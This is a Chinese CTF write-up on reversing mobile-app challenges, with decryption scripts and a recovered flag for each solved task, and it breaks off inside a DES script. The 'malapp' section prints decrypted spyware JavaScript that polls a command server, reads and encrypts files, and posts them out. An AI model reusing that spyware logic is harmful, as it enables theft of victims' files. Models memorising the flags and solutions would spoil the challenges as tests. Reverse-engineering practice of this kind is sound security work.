# 2025数字中国创新大赛-移动互联网（APP）安全积分争夺赛初赛 Writeup-先知社区

> **来源**: https://xz.aliyun.com/news/17586  
> **文章ID**: 17586

---

# 2025数字中国创新大赛-移动互联网（APP）安全积分争夺赛初赛

## 数据加密

### ezenc

> 通用算法最好识别了，真的是这样吗？

验证逻辑在 so 中：

![](images/20250403111914-6b5d18e2-103a-1.png)

加密关键逻辑位于 `sub_18C0` 函数中，简单分析可知是 DFT 变换，提取实部与虚部的对应数据进行逆 DFT 变换即可：

![](images/20250403111917-6d521aa8-103a-1.png)

```
import struct
import numpy as np

double_arrays = bytes.fromhex("00000000008C9F4066C0594A160F6140EEE87FB9160D20C04ED4D2DC0A9959C0F5B86FB54EBA40406FF4311F90166740183E22A644FE3D40DC9C4A0680A55440137F1475E6FD52C012F8C3CF7F0FFA3FB8AD2D3C2F5D5FC000000000004056C0B8AD2D3C2F5D5FC012F8C3CF7F0FFA3F137F1475E6FD52C0DC9C4A0680A55440183E22A644FE3D406FF4311F90166740F5B86FB54EBA40404ED4D2DC0A9959C0EEE87FB9160D20C066C0594A160F6140")
double_array = struct.unpack("d" * (len(double_arrays) // 8), double_arrays)

double_array2 = bytes.fromhex("0000000000000000EA5BE674595A59C0F4DF83D72E5D134068CC24EA057940C040BD19355F65F13FDBDFD91EBD354EC0575EF23FF98B38C04A9869FB57216340548CF337A11C4B4035B39602D21E0740FF3EE3C2014864400000000000000080FF3EE3C2014864C035B39602D21E07C0548CF337A11C4BC04A9869FB572163C0575EF23FF98B3840DBDFD91EBD354E4040BD19355F65F1BF68CC24EA05794040F4DF83D72E5D13C0EA5BE674595A5940")
double_array2 = struct.unpack("d" * (len(double_array2) // 8), double_array2)

real_part = np.array(double_array)
imaginary_part = np.array(double_array2)
complex_array = real_part + 1j * imaginary_part
res = np.fft.ifft(complex_array)
for i in res:
    print(chr(round(i.real)), end="")
# flag{th3_df7_S0_3asy!}
```

### magic

> magic

关键验证逻辑仍然在 so 中：

![](images/20250403111920-6ee065d0-103a-1.png)

关键加密逻辑在 `encrypt` 函数中：

![](images/20250403111922-70573fd1-103a-1.png)

可以看到是一个简单的 AES 加密，但是使用的并不是标准的 S 盒：

![](images/20250403111925-71f15795-103a-1.png)

从流量包中提取 key 后使用新的 S 盒即可解密：

```
from os import urandom

#!------------------------------Sbox------------------------------
s_box = list(
    bytes.fromhex(
        "31525AC80BACF33A8B54279BAB95DE8360CB537FC4E30A97E029D568C5DFF47BAAD642786CE97017D737244975A9896703FAD991B45BC24E92FC46B17308C77409AFECF54D2DEAA5DAEFA62B7E0C8FB004066284158E121D44C0E238D44728456E9D63CFE68C18821B2CEE879410C120074AA4EB77BCD3E1662A6BE779CC8616D0D119553C9FFB3098BDB8F19E61CD90CE7C8D57AE6AB33D76A77188A2BA4F3E40640F482135362FE8145D51D8B5FED29693A1B6430D4C80C9FFA3DD720559BF0E26341F13E5DCF2C6501EE485B7398ACAED9CBB56231AF03258B265336F41BE3F6D1100AD5FC38125A8A09AF6F75E99222E4BF93B027AB95C69F81CDB017DFD"
    )
)

inv_s_box = [0] * 256
for i in range(256):
    inv_s_box[s_box[i]] = i

def xor(a, b):
    return bytes([i ^ j for i, j in zip(a, b)])

#!-------------------------Step1-------------------------
def bytes2matrix(text):
    """Converts a 16-byte array into a 4x4 matrix."""
    return [list(text[i : i + 4]) for i in range(0, len(text), 4)]

def matrix2bytes(matrix):
    """Converts a 4x4 matrix into a 16-byte array."""
    result = []
    for i in matrix:
        for j in i:
            result.append(j)
    return result

#!-------------------------Step2-------------------------
def add_round_key(s, k):
    """
    Arguments:
    s -> the plaintext matrix
    k -> the round key matrix
    """
    result = []
    for i, j in zip(s, k):
        a = []
        for m, n in zip(i, j):
            a.append(m ^ n)
        result.append(a)
    return result

#!-------------------------Step3-------------------------
def sub_bytes(s, sbox=s_box):
    """
    Bytes Substitution
    """
    for i in range(4):
        for j in range(4):
            s[i][j] = sbox[s[i][j]]

def inv_sub_bytes(s):
    """
    inverse Bytes Substitution
    """
    for i in range(4):
        for j in range(4):
            s[i][j] = inv_s_box[s[i][j]]

#!-------------------------Step4-------------------------
def shift_rows(s):
    """
    Row Shift
    """
    s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1]
    s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]
    s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]

def inv_shift_rows(s):
    """
    inverse Row Shift
    """
    s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1]
    s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]
    s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]
    return s

#! multiply by 2 in finite field 2^8
def xtime(a):
    return (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)

def mix_single_column(a):
    """
    Single Column Confusion
    """
    t = a[0] ^ a[1] ^ a[2] ^ a[3]
    u = a[0]
    a[0] ^= t ^ xtime(a[0] ^ a[1])
    a[1] ^= t ^ xtime(a[1] ^ a[2])
    a[2] ^= t ^ xtime(a[2] ^ a[3])
    a[3] ^= t ^ xtime(a[3] ^ u)

def mix_columns(s):
    """
    Column Confusion
    """
    for i in range(4):
        mix_single_column(s[i])

def inv_mix_columns(s):
    """
    inverse Column Confusion
    """
    for i in range(4):
        u = xtime(xtime(s[i][0] ^ s[i][2]))
        v = xtime(xtime(s[i][1] ^ s[i][3]))
        s[i][0] ^= u
        s[i][1] ^= v
        s[i][2] ^= u
        s[i][3] ^= v
    mix_columns(s)

class AES:
    def __init__(self, key: bytes, iv: bytes = None, N_ROUNDS: int = 10) -> None:
        """
        Initialize a AES Cipher

        Arguments:
        key -> 128 bits key (or 192 bits or 256 bits)
        iv -> 128 bits iv, Default is None
        N_ROUNDS -> the round of key expansion (128 -> 10 192 -> 12 256 -> 14)
        """
        self.key = key
        self.iv = iv
        self.N_ROUNDS = N_ROUNDS  #! determine the encryption mode is 128 or 192 or 256

    #!------------------------------Padding------------------------------
    def PKCS7_Padding(self, plaintext):
        """
        根据缺少的字符数来填充
        """
        padding_len = 16 - len(plaintext) % 16
        return plaintext + bytes([padding_len] * padding_len)

    def ISO10126_Padding(self, plaintext):
        """
        最后一个字节填充缺少的字节数, 其他填充随机数
        """
        l = len(plaintext)
        if l % 16 == 0:
            return plaintext
        else:
            add = 16 - (l - (l // 16) * 16)
            for _ in range(0, add - 1):
                plaintext += urandom(1)
            plaintext = plaintext + bytes.fromhex(hex(add)[2:].rjust(2, "0"))
            return plaintext

    #!------------------------------Expand key------------------------------
    def expand_key(self):
        """
        Expands and returns a list of key matrices for the given master_key.
        """
        r_con = (
            0x00,
            0x01,
            0x02,
            0x04,
            0x08,
            0x10,
            0x20,
            0x40,
            0x80,
            0x1B,
            0x36,
            0x6C,
            0xD8,
            0xAB,
            0x4D,
            0x9A,
            0x2F,
            0x5E,
            0xBC,
            0x63,
            0xC6,
            0x97,
            0x35,
            0x6A,
            0xD4,
            0xB3,
            0x7D,
            0xFA,
            0xEF,
            0xC5,
            0x91,
            0x39,
        )
        #! Initialize round keys with raw key material.
        key_columns = bytes2matrix(self.key)
        iteration_size = len(self.key) // 4  #! iteration_size = 4 or 6 or 8
        #! Each iteration has exactly as many columns as the key material.
        i = 1
        while len(key_columns) < (self.N_ROUNDS + 1) * 4:
            #! Copy previous word.
            word = list(key_columns[-1])
            #! Perform schedule_core once every "row".
            if len(key_columns) % iteration_size == 0:
                #! Circular shift.
                word.append(word.pop(0))
                #! Map to S-BOX.
                word = [s_box[b] for b in word]
                #! XOR with first byte of R-CON, since the others bytes of R-CON are 0.
                word[0] ^= r_con[i]
                i += 1
            elif len(self.key) == 32 and len(key_columns) % iteration_size == 4:
                #! Run word through S-box in the fourth iteration when using a
                #! 256-bit key.
                word = [s_box[b] for b in word]
            #! XOR with equivalent word from previous iteration.
            word = bytes(i ^ j for i, j in zip(word, key_columns[-iteration_size]))
            key_columns.append(word)
        #! Group key words in 4x4 byte matrices.
        return [key_columns[4 * i : 4 * (i + 1)] for i in range(len(key_columns) // 4)]

    #!------------------------------Encryption------------------------------
    def encrypt(self, plaintext: bytes) -> bytes:
        """
        Encrytion:
        key expansion -> (add round key -> bytes substitution -> row shift -> column confusion) for N_ROUNDS
        """
        #! Initial add round key step
        round_keys = self.expand_key()
        #! Convert plaintext to state matrix
        state = bytes2matrix(plaintext)
        #! Initial add round key step
        state = add_round_key(state, round_keys[0])

        for i in range(1, self.N_ROUNDS):
            sub_bytes(state)
            shift_rows(state)
            mix_columns(state)
            state = add_round_key(state, round_keys[i])

        #! Run final round (skips the MixColumns step)
        sub_bytes(state)
        shift_rows(state)
        state = add_round_key(state, round_keys[self.N_ROUNDS])

        #! Convert state matrix to plaintext
        ciphertext = matrix2bytes(state)
        return bytes(ciphertext)

    #!------------------------------Decryption------------------------------
    def decrypt(self, ciphertext: bytes) -> bytes:
        """
        Decryption:
        Just reverse the encryption flow
        """
        #! Initial add round key step
        round_keys = self.expand_key()
        #! Convert ciphertext to state matrix
        state = bytes2matrix(ciphertext)
        #! Initial add round key step
        state = add_round_key(state, round_keys[self.N_ROUNDS])

        for i in range(self.N_ROUNDS - 1, 0, -1):
            inv_shift_rows(state)
            inv_sub_bytes(state)
            state = add_round_key(state, round_keys[i])
            inv_mix_columns(state)

        #! Run final round (skips the InvMixColumns step)
        inv_shift_rows(state)
        inv_sub_bytes(state)
        state = add_round_key(state, round_keys[0])

        #! Convert state matrix to plaintext
        plaintext = matrix2bytes(state)
        return bytes(plaintext)

    #!------------------------------AES.all_mode------------------------------
    def AES_encrypt(self, mode: str, plaintext: bytes, padding=None) -> bytes:
        """对明文进行填充"""
        if padding == None or padding == "PKCS7":
            plaintext = self.PKCS7_Padding(plaintext)
        elif padding == "ISO10126":
            plaintext = self.ISO10126_Padding(plaintext)
        #! ECB
        if mode == "AES_ECB":
            ciphertext = b""
            for i in range(0, len(plaintext), 16):
                ciphertext += self.encrypt(plaintext[i : i + 16])
            return ciphertext
        #! CBC
        if mode == "AES_CBC":
            ciphertext = self.encrypt(xor(plaintext[0:16], self.iv))
            for i in range(16, len(plaintext), 16):
                ciphertext += self.encrypt(xor(plaintext[i : i + 16], ciphertext[-16:]))
            return ciphertext

    def AES_decrypt(self, mode: str, ciphertext: bytes) -> bytes:
        #! ECB
        if mode == "AES_ECB":
            plaintext = b""
            for i in range(0, len(ciphertext), 16):
                plaintext += self.decrypt(ciphertext[i : i + 16])
            return plaintext
        #! CBC
        if mode == "AES_CBC":
            plaintext = self.decrypt(xor(plaintext[0:16], self.iv))
            for i in range(16, len(ciphertext), 16):
                plaintext += self.decrypt(xor(plaintext[i : i + 16], ciphertext[-16:]))
            return plaintext

if __name__ == "__main__":
    key = list(bytes.fromhex("12345566778843217034737357723064"))
    enc = bytes.fromhex("60579834a6ee69d0999224ef933457c3")
    tmp = 0
    for i in range(16):
        tmp = (0x99 * tmp - 1) & 0xFF
        key[i] = key[i] ^ tmp
    cipher = AES(key=bytes(key))
    dec = cipher.AES_decrypt("AES_ECB", enc)
    print(dec.decode())
# flag{3a7e1d9c0b8f4e56}
```

### babyapk

> 简单的安卓逆向

关键逻辑还是在 so 中：

![](images/20250403111928-73bf03a8-103a-1.png)

so 中就是简单的异或加密：

![](images/20250403111931-755596b1-103a-1.png)

但需要注意在 init\_array 中会调用 `hide_key` 函数对 key 进行修改，解密脚本如下：

```
enc = [119, 9, 40, 44, 106, 84, 113, 124, 34, 93, 122, 121, 119, 4, 120, 124, 36, 7, 127, 42, 117, 6, 112, 41, 32, 4, 112, 47, 119, 81, 123, 47, 33, 81, 40, 120, 114, 24]
key = list(b"VWXY")
key[0] ^= 0x47
key[1] ^= 0x32
key[2] ^= 0x11
key[3] ^= 0x12

for i in range(len(enc)):
    enc[i] = enc[i] ^ key[i % len(key)]
dec = bytes(enc)
print(dec.decode("utf-8"))
# flag{1873832fa175b6adc9b1a9df42d04a3c}
```

## 逆向工程

### GoodLuck

> 一个简单的算法逆向  
> flag格式：flag{youget}

`com.ctf.goodluck0.MainActivity#check` 看到如下代码：

![](images/20250403111932-76576fcd-103a-1.png)

md5，cmd5 查询：

![](images/20250403111934-776e5729-103a-1.png)

flag: `flag{r9d3jv4}`

### 偷天换日

> 一个算法逆向

验证逻辑在 so 中：

![](images/20250403111936-788940a6-103a-1.png)

`JNI_Onload` 会调用 `sub_DD38`，这个函数中会对 `assets/cc.dat` 进行 rc4 解密后得到一个 dex：

![](images/20250403111939-7a37df45-103a-1.png)

![](images/20250403111942-7c0a281e-103a-1.png)

里面是个简单的 base58 编码：

![](images/20250403111945-7dc8c7b6-103a-1.png)

![](images/20250403111948-7f856a47-103a-1.png)

flag: `flag{j#n$j@m^,*4}`

### IOSApp

> 安全审计员审查发现revealFlag函数比较可疑，请分析代码，帮她找到与之相关的flag

ida 逆向 swift，在 strings 中看到两段可疑字符串

跟进 base64 可以看到逻辑是拼接一个 base64

![](images/20250403111950-80a03110-103a-1.png)

结果为 ZmxhZ3tvbGRlc3RfdHJpY2tfaW5fdGhlX2Jvb2tzfQ==，解密后为 `flag{oldest_trick_in_the_books}`，假 flag

跟进第二个可以字符串可以进入到 `obfuscatedFlag` 的初始化函数：

![](images/20250403111952-81f650e0-103a-1.png)

在 revealflag 函数中看到在 map 中使用闭包函数对 obfuscatedFlag 进行了操作：

![](images/20250403111954-83690eb2-103a-1.png)

闭包函数取一位 char 并且对其进行`-1`运算，可以知道是将 obfuscatedFlag 逐字符`-1`

```
flag = 'gmbh|zpv`mppljoh`gps`nf~'
for i in flag:
    print(chr(ord(i)-1), end='')
#flag{you_looking_for_me}
```

### WASMSAW

> flag提交格式：flag{youget}

首先可以看到运行了一段 lua 字节码：

![](images/20250403111958-85e1cb51-103a-1.png)

简单反编译可以看到是在加载一个 dex：

![](images/20250403112002-87edb9ff-103a-1.png)

dex 中将 key 进行了替换：

![](images/20250403112004-897927bf-103a-1.png)

关键的验证逻辑在 so 层中：

![](images/20250403112008-8b9b10c7-103a-1.png)

so 层可以看出是在加载 wasm 执行，执行的 wasm 文件位于 `assets/lib_wasm.wasm`，反编译一下可以看到具体逻辑：

![](images/20250403112011-8d9d6531-103a-1.png)

![](images/20250403112014-8f273875-103a-1.png)

第一部分简单分析可以知道是 rc4 算法，第二部分是在加载密文，解密即可：

![](images/20250403112019-9263b5b0-103a-1.png)

flag: `flag{4e574fa93be5e847453f6871115e2c08}`

## 通信安全

### 这个木马在干啥

> 这是个恶意木马样本，前面抓了个数据包，现在发现app服务器无法访问了，请你看看木马在干啥？

关键逻辑位于 so 层中：

![](images/20250403112022-940b881a-103a-1.png)

解密逻辑在 `sub_1122C` 函数中：

![](images/20250403112025-958073cc-103a-1.png)

简单进行 AES 解密，key 需要进行一些异或计算后可以得到，然后进行解密即可：

![](images/20250403112027-96dc7572-103a-1.png)

### 我的传输安全吗？

> 小明是个技术宅男，今年大年30还在让测试同学开启测试服务器，完成公司风控sdk功能的测试。看了一会春晚，小明觉得没意思，就去测试了，测试过程中在路由器上抓到了一些报文数据，因为看不懂内容，就先保存成了bin文件，你能帮忙看看嘛？

用时间戳做种子构建随机密钥的 rc4

![](images/20250403112029-982c5b0d-103a-1.png)

![](images/20250403112031-996cdf40-103a-1.png)

题目描述里说在今年春晚期间，用春晚期间的时间戳进行爆破

```
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

static void rc4_init(unsigned char* s_box, unsigned char* key, unsigned int key_len)
{
    unsigned char Temp[256];
    int i;
    for (i = 0; i < 256; i++)
    {
        s_box[i] = i;//顺序填充S盒
        Temp[i] = key[i%key_len];//生成临时变量T
    }
    int j = 0;
    for (i = 0; i < 256; i++)//打乱S盒
    {
        j = (j + s_box[i] + Temp[i]) % 256;
        unsigned char tmp = s_box[i];
        s_box[i] = s_box[j];
        s_box[j] = tmp;
    }
}

void rc4_crypt(unsigned char* data, unsigned int data_len, unsigned char* key, unsigned int key_len)
{
    unsigned char s_box[256];
    rc4_init(s_box, key, key_len);
    unsigned int i = 0, j = 0, t = 0;
    unsigned int Temp;
    for (Temp = 0; Temp < data_len; Temp++)
    {
        i = (i + 1) % 256;
        j = (j + s_box[i]) % 256;
        unsigned char tmp = s_box[i];
        s_box[i] = s_box[j];
        s_box[j] = tmp;
        t = (s_box[i] + s_box[j]) % 256;
        data[Temp] ^= s_box[t];
    }
}

char text_set[63] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

int main()
{
    unsigned char text[100] = "\x2a\x1d\x74\xbb\xc1\x03\xd4\x7e\xf3\x34\xa2\x8e\x57\xd1\x8e\x62";
    int timestamp_start = 1738065600;
    int timestamp_end = 1738110599;
    for(int i=timestamp_start; i<=timestamp_end; i++)
    {
        srand(i);
        unsigned char in_text[100] = {};
        strcpy(in_text, text);
        unsigned char key[20] = {};
        int index = 0;
        for(int j=0; j<16; j++)
        {
            int temp_int = rand() % 62;
            char crypt = text_set[temp_int];
            key[index++] = crypt;
        }
        rc4_crypt(in_text, strlen(in_text), key, strlen(key));
        int flag = 1;
        for(int j=0; j<strlen(in_text); j++)
        {
            if(in_text[j]>126 || in_text[j]<32)
            {
                flag = 0;
                break;
            }
        }
        if(flag && strlen(in_text) == strlen(text))
        {
            for(int j=0; j<strlen(in_text); j++)
            {
                printf("%c", in_text[j]);

            }
            printf("
");
        }

    }
    return 0;
}
```

安卓下编译运行：

![](images/20250403112033-9a931309-103a-1.png)

flag: `flag{ik*klme#$0}`

### malapp

> 小明给手机中一个未知APP授予了读写文件的权限，过了几天小明所在公司的重要文档泄露了，防火墙检测到小明手机有可疑流量产生，安全部门找到小明并分析该APP。

说明文档：

> service文件夹里面的是题目运行的所需的间谍软件服务端  
> 解题者需要运行服务端，App输入以下格式的URL http://服务端IP:9701 点击launch执行间谍功能  
> 注：题目提供的服务端里没有解密函数

首先看 apk，主要逻辑就是运行一个 native 函数：

![](images/20250403112035-9bb63ac8-103a-1.png)

反编译 so，首先根据 `execJS` 可以定位到函数：

![](images/20250403112038-9daf4163-103a-1.png)

这里做了一个 xor 的操作，结合流量包中的第一段数据可以进行解密：

![](images/20250403112041-9f4fce62-103a-1.png)

```
var url = getURL();

function generateSessionId() {
    let date = new Date();
    let timestamp = date.getTime();
    let random = Math.floor(Math.random() * 1000);
    return timestamp.toString() + random.toString().padStart(3, '0');
}

var session_id = generateSessionId();

function executeCommand(command) {
    let command_type = command.command_type;
    let args = command.args;
    if (command_type == "list_dir") {
        let fileslist = listDir(args[0]);
        let body = {
            session_id: session_id,
            result: fileslist.join("
")
        };
        let jsonString = JSON.stringify(body);
        let response = httpPost(url+"/result", jsonString);
    }
    if (command_type == "read_file") {
        let file_path = args[0];
        let file_content = readFile(file_path);
        let hexContent = encryption.my_encryption(file_content);
        let body = {
            session_id: session_id,
            result: hexContent
        };
        let jsonString = JSON.stringify(body);
        let response = httpPost(url+"/result", jsonString);
    }
}

function heartbeat() {
    let body = {
        session_id: session_id
    };
    let jsonString = JSON.stringify(body);
    let response = httpPost(url+"/heartbeat", jsonString);
    let responseObj = JSON.parse(response);
    if (responseObj.data) {
        executeCommand(responseObj.data);
    }
}

function main111() { 
    // real?
    let ret = encryption.my_encryption('123');
    while (true) {
        heartbeat();
        sleep(1000);
    }
} main111();
```

可以看到有一个 `encryption.my_encryption` 函数，大概率就是自己注册到 v8 中的函数，需要找到其实现的逻辑，根据字符串定位可以找到其注册的函数 `JsExecutor::SetupEncryption`，同时字符串查找 `encrypt` 等关键字发现存在 RSA 加密函数，通过引用查找成功定位到注册的 Handler：

![](images/20250403112044-a0f06c4e-103a-1.png)

逆向 `rsa_encrypt` 函数逻辑，可以在其中找到加载模数并加密的逻辑：

![](images/20250403112046-a2465af2-103a-1.png)

提取模数简单分解后取指数为 0x10001 解密即可：

```
from Crypto.Util.number import long_to_bytes

enc = 0x00458c2ba99e8f209cbe6105df0f789ef056f1e4906139407320e2e0d46cd2db

n = 0xC8B752FA2DA66A4B463495AEFF4AC4745072B5935B8F7DF6FECD3CCBBA42B8A5
p = 267080459792164810304149285205541345709
q = n // p
assert p * q == n

e = 0x10001
d = pow(e, -1, (p-1)*(q-1))
m = pow(enc, d, n)
print(long_to_bytes(m).decode())
```

flag: `flag{V8_Js_engin3_i5_Awes0m3!}`

### MedSecureAdmin

> 一个http服务和加密系统组成，尝试破解该系统就可获取flag。

首先在 Java 层对 username 有校验：

![](images/20250403112049-a3f9c059-103a-1.png)

通过一下代码解密：

```
public class test {
    static class LI {
        private byte[] lIIl = new byte[256];
        private int lIlI = 0;
        private int lIll = 0;

        public LI(byte[] bArr) {
            for (int i = 0; i < 256; i++) {
                this.lIIl[i] = (byte) i;
            }
            int i2 = 0;
            for (int i3 = 0; i3 < 256; i3++) {
                byte[] bArr2 = this.lIIl;
                byte b = bArr2[i3];
                i2 = (i2 + b + bArr[i3 % bArr.length]) & 255;
                bArr2[i3] = bArr2[i2];
                bArr2[i2] = b;
            }
        }

        public byte[] ll(byte[] bArr) {
            byte[] bArr2 = new byte[bArr.length];
            for (int i = 0; i < bArr.length; i++) {
                int i2 = this.lIlI & 255;
                this.lIlI = i2;
                int i3 = this.lIll;
                byte[] bArr3 = this.lIIl;
                byte b = bArr3[i2];
                int i4 = (i3 + b + 1) & 255;
                this.lIll = i4;
                bArr3[i2] = bArr3[i4];
                bArr3[i4] = b;
                bArr2[i] = (byte) ((bArr3[((bArr3[i2] + b) + bArr3[(i2 + i4) & 255]) & 255] ^ bArr[i]) ^ 119);
            }
            return bArr2;
        }
    }

    public static void main(String[] args) {
        byte[] ll = new byte[]{-90, 31, 41, 86, -9, 80, 101, 116};
        byte[] lII = new byte[]{-115, -12, -111, 106, 117, 25, 17, -93, 104, -74, 104, -28, 22, -109, 17, 73};
        byte[] ll2 = new LI(lII).ll(ll);
        int i = 0;
        while (true) {
            int length = ll.length;
            if (i >= length) {
                break;
            }
            ll2[i] = (byte) (ll2[i] ^ lII[i % lII.length]);
            i++;
        }
        System.out.println(new String(ll2));
    }
}
```

username 为 `@dm1n234` ，在 so 层存在对 password 的校验：

![](images/20250403112051-a57d2aba-103a-1.png)

`sub_ADC` 是一个魔改的 DES，对其中 S 盒替换的一些字节做了变换，照着代码逻辑扒下来替换后解密即可（DES 的 key 就是 username）：

```
S_box = [
    [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
     0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
     4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
     15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],
    [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
     3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
     0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
     13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],
    [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
     13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
     13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
     1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],
    [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
     13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
     10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
     3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],
    [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
     14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
     4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
     11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],
    [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
     10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
     9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
     4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],
    [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
     13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
     1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
     6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],
    [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
     1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
     7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
     2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]
]

p1 = [57, 49, 41, 33, 25, 17,  9,  1, 58, 50, 42, 34, 26, 18,
      10,  2, 59, 51, 43, 35, 27, 19, 11,  3, 60, 52, 44, 36,
      63, 55, 47, 39, 31, 23, 15,  7, 62, 54, 46, 38, 30, 22,
      14,  6, 61, 53, 45, 37, 29, 21, 13,  5, 28, 20, 12,  4]

p = [14, 17, 11, 24,  1,  5,  3, 28, 15,  6, 21, 10,
     23, 19, 12,  4, 26,  8, 16,  7, 27, 20, 13,  2,
     41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48,
     44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32]

IP = [58, 50, 42, 34, 26, 18, 10,  2, 60, 52, 44, 36, 28, 20, 12,  4,
      62, 54, 46, 38, 30, 22, 14,  6, 64, 56, 48, 40, 32, 24, 16,  8,
      57, 49, 41, 33, 25, 17,  9,  1, 59, 51, 43, 35, 27, 19, 11,  3,
      61, 53, 45, 37, 29, 21, 13,  5, 63, 55, 47, 39, 31, 23, 15,  7]

inv_IP = [40,  8, 48, 16, 56, 24, 64, 32, 39,  7, 47, 15, 55, 23, 63, 31,
          38,  6, 46, 14, 54, 22, 62, 30, 37,  5, 45, 13, 53, 21, 61, 29,
          36,  4, 44, 12, 52, 20, 60, 28, 35,  3, 43, 11, 51, 19, 59, 27,
          34,  2, 42, 10, 50, 18, 58, 26, 33,  1, 41,  9, 49, 17, 57, 25]

E = [32,  1,  2,  3,  4,  5,  4,  5,  6,  7,  8,  9,
     8,  9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17,
     16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,
     24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32,  1]

P_box = [16,  7, 20, 21, 29, 12, 28, 17,  1, 15, 23, 26,  5, 18, 31, 10,
         2,  8, 24, 14, 32, 27,  3,  9, 19, 13, 30,  6, 22, 11,  4, 25]

def HIDWORD(x):
    return (x >> 32) & 0xffffffff

class DES():
    def __init__(self, key: int) -> None:
        """
        Initalize a DES cipher

        key -> the 64-bit key
        """
        self.key = bin(key)[2:].rjust(64, "0")
        self.subkeys = []

#!------------------------------Generate round key--------------------------------------
    def select_permutation_1(self):
        """
        The first round of selective permutation
        select 56-bit subkey from 64-bit key, and divide it into two parts
        """
        if len(self.key) != 64:
            raise Exception("[Error]The length of key must be 64 bit")
        #! transform to int
        return [int(self.key[i-1]) for i in p1[:28]], [int(self.key[i-1]) for i in p1[28:]]

    def select_permutation_2(self, subkey: list) -> list:
        """
        The second round of selective permutation
        select 48-bit subkey from 56-bit key
        """
        if len(subkey) != 56:
            raise Exception("[Error]The length of subkey must be 56")
        return [subkey[i-1] for i in p]

    def leftRotation(self, a: list, off: int) -> list:
        """
        Implement loop left shift
        """
        return a[off:] + a[:off]

    def keyGen(self):
        """
        Generate 16 round key

        Logical flow:
        64-bit key -> select_permutaion_1 -> 56-bit key(left + right)
        leftRotation(left) + leftRotation(right) -> round key 0
        leftRotation(left) + leftRotation(right) -> round key 1
        leftRotation(left) + leftRotation(right) -> round key 2
        ...
        """
        if len(self.key) != 64:
            raise Exception("[Error]The length of initial key must be 64")
        left, right = self.select_permutation_1()
        # ! The leftrotation offset array
        off = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]

        for i in range(16):
            left = self.leftRotation(left, off[i])
            right = self.leftRotation(right, off[i])
            self.subkeys.append(self.select_permutation_2(left+right))
#!---------------------------------encryption--------------------------------------

    def Initial_permutation(self, text: list) -> list:
        """
        The initial permutation
        """
        return [int(text[i-1]) for i in IP]  # ! transform to int

    def inv_Initial_permutation(self, text: list) -> list:
        """
        The inverse initial permutation
        """
        return [text[i-1] for i in inv_IP]

    def Expand(self, text: list) -> list:
        """
        Expand permutation

        32-bit text -> 48-bit text
        """
        if len(text) != 32:
            raise Exception("[Error]The length must be 32")
        return [text[i-1] for i in E]

    def P_permutation(self, text: list) -> list:
        """
        The P permutation
        """
        if len(text) != 32:
            raise Exception("[Error]The length must be 32")
